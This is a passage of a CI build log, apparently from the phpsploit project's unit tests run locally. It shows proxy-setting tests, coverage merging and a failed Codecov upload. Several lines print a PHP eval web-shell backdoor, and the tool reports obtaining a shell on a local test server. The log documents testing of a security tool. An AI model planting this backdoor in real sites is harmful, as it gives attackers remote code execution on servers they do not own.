(127.0.0.1)\n[Unit Tests/build]   | running PHP 8.0.10 on PHP 8.0.10 Development Server\n[Unit Tests/build]   | [#] CMD('exploit'): Returned 0\n[Unit Tests/build]   | [#] CMD('exit'): Running...\n[Unit Tests/build]   | [#] CMD('exit'): Returned 0\n[Unit Tests/build]   | invalid_scheme=socks\n[Unit Tests/build]   | [#] CMD('exploit'): Running...\n[Unit Tests/build]   | [*] Current backdoor is: <?php @eval($_SERVER['HTTP_PHPSPL01T']); ?>\n[Unit Tests/build]   | \n[Unit Tests/build]   | [*] Sending payload to http://127.0.0.1:42211/ ...\n[Unit Tests/build]   | [*] Shell obtained by PHP (127.0.0.1 -> 127.0.0.1)\n[Unit Tests/build]   | \n[Unit Tests/build]   | Connected to Linux server (127.0.0.1)\n[Unit Tests/build]   | running PHP 8.0.10 on PHP 8.0.10 Development Server\n[Unit Tests/build]   | [#] CMD('exploit'): Returned 0\n[Unit Tests/build]   | [#] CMD('exit'): Running...\n[Unit Tests/build]   | [#] CMD('exit'): Returned 0\n[Unit Tests/build]   | invalid_scheme=socks4h\n[Unit Tests/build]   | [#] CMD('exploit'): Running...\n[Unit Tests/build]   | [*] Current backdoor is: <?php @eval($_SERVER['HTTP_PHPSPL01T']); ?>\n[Unit Tests/build]   | \n[Unit Tests/build]   | [*] Sending payload to http://127.0.0.1:42211/ ...\n[Unit Tests/build]   | [*] Shell obtained by PHP (127.0.0.1 -> 127.0.0.1)\n[Unit Tests/build]   | \n[Unit Tests/build]   | Connected to Linux server (127.0.0.1)\n[Unit Tests/build]   | running PHP 8.0.10 on PHP 8.0.10 Development Server\n[Unit Tests/build]   | [#] CMD('exploit'): Returned 0\n[Unit Tests/build]   | [#] CMD('exit'): Running...\n[Unit Tests/build]   | [#] CMD('exit'): Returned 0\n[Unit Tests/build]   | invalid_scheme=socks5a\n[Unit Tests/build]   | [#] CMD('exploit'): Running...\n[Unit Tests/build]   | [*] Current backdoor is: <?php @eval($_SERVER['HTTP_PHPSPL01T']); ?>\n[Unit Tests/build]   | \n[Unit Tests/build]   | [*] Sending payload to http://127.0.0.1:42211/ ...\n[Unit Tests/build]   | [*] Shell obtained by PHP (127.0.0.1 -> 127.0.0.1)\n[Unit Tests/build]   | \n[Unit Tests/build]   | Connected to Linux server (127.0.0.1)\n[Unit Tests/build]   | running PHP 8.0.10 on PHP 8.0.10 Development Server\n[Unit Tests/build]   | [#] CMD('exploit'): Returned 0\n[Unit Tests/build]   | [#] CMD('exit'): Running...\n[Unit Tests/build]   | [#] CMD('exit'): Returned 0\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mfor scheme in $valid_schemes; do\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    echo valid_scheme=$scheme\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    phpsploit_pipe set PROXY \"$scheme://0.0.0.0:23487\" > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    assert_no_output $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    phpsploit_pipe set PROXY > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    assert_contains $TMPFILE \"$scheme://0.0.0.0:23487\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    phpsploit_pipe exploit > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    if [[ \"$scheme\" == \"socks4\"* ]]; then\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        assert_contains $TMPFILE \"Request error: Error connecting to SOCKS4 proxy \"\u001b[m\n[Unit Tests/build]   | valid_scheme=http\n[Unit Tests/build]   | \u001b[33;2m    elif [[ \"$scheme\" == \"socks5\"* ]]; then\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        assert_contains $TMPFILE \"Request error: Error connecting to SOCKS5 proxy \"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    fi\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdone\u001b[m\n[Unit Tests/build]   | valid_scheme=https\n[Unit Tests/build]   | valid_scheme=socks4\n[Unit Tests/build]   | valid_scheme=socks4a\n[Unit Tests/build]   | valid_scheme=socks5\n[Unit Tests/build]   | valid_scheme=socks5h\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# phpsploit_pipe set PROXY https://0.0.0.0:23487 > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# assert_no_output $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# phpsploit_pipe exploit && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# phpsploit_pipe set PROXY None > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# assert_no_output $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# phpsploit_pipe exploit || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# phpsploit_pipe exit\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# phpsploit_pipe help\u001b[m\n[Unit Tests/build]   | \u001b[33;2mexit_script\u001b[m\n[Unit Tests/build]   | \u001b[0m\u001b[1;32m[+]\u001b[0;32m /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/settings/PROXY.sh succeeded\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m TEST_TIME=5s\u001b[0m\n[Unit Tests/build]   | \n[Unit Tests/build]   | \n[Unit Tests/build]   | \n[Unit Tests/build]   | find -name \".coverage\\.*\"\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11229.848347\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.4427.998407\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11437.526281\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.12177.817521\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11308.896122\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11366.873320\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.4883.847306\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11119.246506\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11268.085131\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11181.425624\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11202.094055\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11118.693266\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11351.839696\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11343.257223\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11379.759476\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.316.907908\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11464.251825\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11611.305145\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11554.241368\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11125.662900\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11310.156493\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11179.015654\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11212.536314\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11261.987909\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11164.500188\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11462.732467\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11294.729949\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11123.577419\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11318.927170\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.141.791085\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11216.978998\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11277.711003\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11250.373653\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.9040.416305\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11266.678029\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.9034.319588\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11355.093774\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11320.341519\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11207.124617\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11348.201697\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11338.029378\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11393.679131\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11391.330349\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11161.959153\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11381.014243\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.9118.237503\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.9024.323927\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11248.347430\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11494.872116\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11441.821140\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11237.988757\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.9053.167674\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11426.376516\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11586.257986\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11364.013166\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11200.305097\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11167.194652\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11512.176389\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.1517.952787\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11306.829951\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11303.576853\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.1823.996093\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.9020.299569\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11433.207132\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11264.853387\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11336.441775\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.7336.702435\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11231.717125\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11377.506030\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.110.999344\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11298.151159\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11177.151785\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.12047.239453\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11525.458576\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11439.748360\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11332.061133\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11334.860070\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.9013.088882\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11220.797154\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11198.129945\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11257.780513\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11383.148232\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11279.160141\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11252.484621\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11218.764141\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11296.131854\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.144.584535\n[Unit Tests/build]   | ./.coverage.f96b847cbeea.11353.031436\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11229.848347\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.4427.998407\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11437.526281\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.12177.817521\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11308.896122\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11366.873320\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.4883.847306\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11119.246506\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11268.085131\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11181.425624\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11202.094055\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11118.693266\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11351.839696\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11343.257223\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11379.759476\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.316.907908\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11464.251825\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11611.305145\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11554.241368\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11125.662900\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11310.156493\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11179.015654\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11212.536314\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11261.987909\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11164.500188\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11462.732467\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11294.729949\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11123.577419\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11318.927170\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.141.791085\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11216.978998\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11277.711003\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11250.373653\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.9040.416305\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11266.678029\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.9034.319588\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11355.093774\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11320.341519\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11207.124617\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11348.201697\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11338.029378\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11393.679131\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11391.330349\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11161.959153\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11381.014243\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.9118.237503\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.9024.323927\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11248.347430\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11494.872116\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11441.821140\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11237.988757\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.9053.167674\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11426.376516\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11586.257986\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11364.013166\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11200.305097\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11167.194652\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11512.176389\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.1517.952787\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11306.829951\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11303.576853\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.1823.996093\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.9020.299569\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11433.207132\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11264.853387\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11336.441775\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.7336.702435\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11231.717125\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11377.506030\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.110.999344\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11298.151159\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11177.151785\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.12047.239453\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11525.458576\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11439.748360\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11332.061133\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11334.860070\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.9013.088882\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11220.797154\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11198.129945\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.11257.780513\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11383.148232\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11279.160141\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11252.484621\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11218.764141\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11296.131854\n[Unit Tests/build]   | Combined data file .coverage.f96b847cbeea.144.584535\n[Unit Tests/build]   | Skipping duplicate data .coverage.f96b847cbeea.11353.031436\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m =========================== TESTS SUMMARY ============================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m All tests (15) succeeded! \u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m TOTAL_TIME=157\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \n[Unit Tests/build]   \u2705  Success - Main Run phpsploit unit tests\n[Unit Tests/build] \u2b50 Run Main Upload coverage to Codecov\n[Unit Tests/build]   \ud83d\udc33  docker cp src=/home/andre-silva/.cache/act/codecov-codecov-action@v2/ dst=/var/run/act/actions/codecov-codecov-action@v2/\n[Unit Tests/build]   \ud83d\udc33  docker exec cmd=[chown -R 1012:1000 /var/run/act/actions/codecov-codecov-action@v2/] user=0 workdir=\n[Unit Tests/build]   \ud83d\udc33  docker exec cmd=[node /var/run/act/actions/codecov-codecov-action@v2/dist/index.js] user= workdir=\n[Unit Tests/build]   | ==> linux OS detected\n[Unit Tests/build]   | https://uploader.codecov.io/latest/linux/codecov.SHA256SUM\n[Unit Tests/build]   | ==> SHASUM file signed by key id 806bb28aed779869\n[Unit Tests/build]   | ==> Uploader SHASUM verified (02b055414cc124203ab061ffc45f5497ca39ede5e63a06717a6981c32d7b425f  codecov)\n[Unit Tests/build]   | ==> Running version latest\n[Unit Tests/build]   | ==> Running version v0.5.0\n[Unit Tests/build]   | [command]/run/act/actions/codecov-codecov-action@v2/dist/codecov -n  -Q github-action-2.1.0 -e OS,PYTHON -Z -v\n[Unit Tests/build]   | [2023-05-29T15:33:01.178Z] ['verbose'] Start of uploader: 1685374381178...\n[Unit Tests/build]   | [2023-05-29T15:33:01.180Z] ['info'] \n[Unit Tests/build]   |      _____          _\n[Unit Tests/build]   |     / ____|        | |\n[Unit Tests/build]   |    | |     ___   __| | ___  ___ _____   __\n[Unit Tests/build]   |    | |    / _ \\ / _` |/ _ \\/ __/ _ \\ \\ / /\n[Unit Tests/build]   |    | |___| (_) | (_| |  __/ (_| (_) \\ V /\n[Unit Tests/build]   |     \\_____\\___/ \\__,_|\\___|\\___\\___/ \\_/\n[Unit Tests/build]   | \n[Unit Tests/build]   |   Codecov report uploader 0.5.0\n[Unit Tests/build]   | [2023-05-29T15:33:01.190Z] ['info'] => Project root located at: /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit\n[Unit Tests/build]   | [2023-05-29T15:33:01.197Z] ['info'] -> No token specified or token is empty\n[Unit Tests/build]   | [2023-05-29T15:33:01.197Z] ['verbose'] Start of network processing...\n[Unit Tests/build]   | [2023-05-29T15:33:01.197Z] ['verbose'] Searching for files in /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit\n[Unit Tests/build]   | [2023-05-29T15:33:01.382Z] ['info'] Running coverage xml...\n[Unit Tests/build]   | [2023-05-29T15:33:02.930Z] ['verbose'] Wrote XML report to coverage.xml\n[Unit Tests/build]   | [2023-05-29T15:33:02.930Z] ['info'] Searching for coverage files...\n[Unit Tests/build]   | [2023-05-29T15:33:02.993Z] ['info'] Warning: Some files located via search were excluded from upload.\n[Unit Tests/build]   | [2023-05-29T15:33:02.994Z] ['info'] If Codecov did not locate your files, please review https://docs.codecov.com/docs/supported-report-formats\n[Unit Tests/build]   | [2023-05-29T15:33:02.994Z] ['verbose'] Preparing to clean the following coverage paths: coverage.xml,data/quotes.lst,data/user_agents.lst\n[Unit Tests/build]   | [2023-05-29T15:33:02.994Z] ['info'] => Found 3 possible coverage files:\n[Unit Tests/build]   |   coverage.xml\n[Unit Tests/build]   |   data/quotes.lst\n[Unit Tests/build]   |   data/user_agents.lst\n[Unit Tests/build]   | [2023-05-29T15:33:02.994Z] ['verbose'] End of network processing\n[Unit Tests/build]   | [2023-05-29T15:33:02.994Z] ['info'] Processing /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/coverage.xml...\n[Unit Tests/build]   | [2023-05-29T15:33:02.997Z] ['info'] Processing /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/data/quotes.lst...\n[Unit Tests/build]   | [2023-05-29T15:33:02.997Z] ['info'] Processing /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/data/user_agents.lst...\n[Unit Tests/build]   | [2023-05-29T15:33:03.004Z] ['info'] Detected GitHub Actions as the CI provider.\n[Unit Tests/build]   | [2023-05-29T15:33:03.004Z] ['verbose'] -> Using the following env variables:\n[Unit Tests/build]   | [2023-05-29T15:33:03.004Z] ['verbose']      GITHUB_ACTION: 7\n[Unit Tests/build]   | [2023-05-29T15:33:03.004Z] ['verbose']      GITHUB_HEAD_REF: \n[Unit Tests/build]   | [2023-05-29T15:33:03.004Z] ['verbose']      GITHUB_REF: refs/heads/master\n[Unit Tests/build]   | [2023-05-29T15:33:03.005Z] ['verbose']      GITHUB_REPOSITORY: nil0x42/phpsploit\n[Unit Tests/build]   | [2023-05-29T15:33:03.005Z] ['verbose']      GITHUB_RUN_ID: 1\n[Unit Tests/build]   | [2023-05-29T15:33:03.005Z] ['verbose']      GITHUB_SERVER_URL: https://github.com\n[Unit Tests/build]   | [2023-05-29T15:33:03.005Z] ['verbose']      GITHUB_SHA: 7b262f6a7fbb69905028757c03c6c73d71a63c8c\n[Unit Tests/build]   | [2023-05-29T15:33:03.005Z] ['verbose']      GITHUB_WORKFLOW: Unit Tests\n[Unit Tests/build]   | [2023-05-29T15:33:03.248Z] ['verbose'] Using the following upload parameters:\n[Unit Tests/build]   | [2023-05-29T15:33:03.248Z] ['verbose'] branch\n[Unit Tests/build]   | [2023-05-29T15:33:03.248Z] ['verbose'] build\n[Unit Tests/build]   | [2023-05-29T15:33:03.248Z] ['verbose'] buildURL\n[Unit Tests/build]   | [2023-05-29T15:33:03.248Z] ['verbose'] commit\n[Unit Tests/build]   | [2023-05-29T15:33:03.248Z] ['verbose'] job\n[Unit Tests/build]   | [2023-05-29T15:33:03.248Z] ['verbose'] pr\n[Unit Tests/build]   | [2023-05-29T15:33:03.248Z] ['verbose'] service\n[Unit Tests/build]   | [2023-05-29T15:33:03.248Z] ['verbose'] slug\n[Unit Tests/build]   | [2023-05-29T15:33:03.248Z] ['verbose'] name\n[Unit Tests/build]   | [2023-05-29T15:33:03.248Z] ['verbose'] tag\n[Unit Tests/build]   | [2023-05-29T15:33:03.248Z] ['verbose'] flags\n[Unit Tests/build]   | [2023-05-29T15:33:03.249Z] ['verbose'] parent\n[Unit Tests/build]   | [2023-05-29T15:33:03.250Z] ['info'] Pinging Codecov: https://codecov.io/upload/v4?package=github-action-2.1.0-uploader-0.5.0&token=*******&branch=master&build=1&build_url=https%3A%2F%2Fgithub.com%2Fnil0x42%2Fphpsploit%2Factions%2Fruns%2F1&commit=7b262f6a7fbb69905028757c03c6c73d71a63c8c&job=Unit+Tests&pr=&service=github-actions&slug=nil0x42%2Fphpsploit&name=&tag=&flags=&parent=\n[Unit Tests/build]   | [2023-05-29T15:33:03.250Z] ['verbose'] Passed token was 0 characters long\n[Unit Tests/build]   | [2023-05-29T15:33:03.250Z] ['verbose'] https://codecov.io/upload/v4?package=github-action-2.1.0-uploader-0.5.0&branch=master&build=1&build_url=https%3A%2F%2Fgithub.com%2Fnil0x42%2Fphpsploit%2Factions%2Fruns%2F1&commit=7b262f6a7fbb69905028757c03c6c73d71a63c8c&job=Unit+Tests&pr=&service=github-actions&slug=nil0x42%2Fphpsploit&name=&tag=&flags=&parent=\n[Unit Tests/build]   |         Content-Type: 'text/plain'\n[Unit Tests/build]   |         Content-Encoding: 'gzip'\n[Unit Tests/build]   |         X-Reduced-Redundancy: 'false'\n[Unit Tests/build]   | [2023-05-29T15:33:03.627Z] ['error'] There was an error running the uploader: Error uploading to https://codecov.io: Error: There was an error fetching the storage URL during POST: 404 - {'detail': ErrorDetail(string='Unable to locate build via Github Actions API. Please upload with the Codecov repository upload token to resolve issue.', code='not_found')}\n[Unit Tests/build]   | [2023-05-29T15:33:03.629Z] ['verbose'] The error stack is: Error: Error uploading to https://codecov.io: Error: There was an error fetching the storage URL during POST: 404 - {'detail': ErrorDetail(string='Unable to locate build via Github Actions API. Please upload with the Codecov repository upload token to resolve issue.', code='not_found')}\n[Unit Tests/build]   |     at main (/snapshot/repo/dist/src/index.js)\n[Unit Tests/build]   |     at processTicksAndRejections (node:internal/process/task_queues:96:5)\n[Unit Tests/build]   | [2023-05-29T15:33:03.629Z] ['verbose'] End of uploader: 2451 milliseconds\n[Unit Tests/build]   \u2757  ::error::Codecov: Failed to properly upload: The process '/run/act/actions/codecov-codecov-action@v2/dist/codecov' failed with exit code 255\n[Unit Tests/build]   \u274c  Failure - Main Upload coverage to Codecov\n[Unit Tests/build] exitcode '1': failure\n[Unit Tests/build] \ud83c\udfc1  Job failed\n",
    "actions_stderr": "Error: Job 'build' failed\n"
}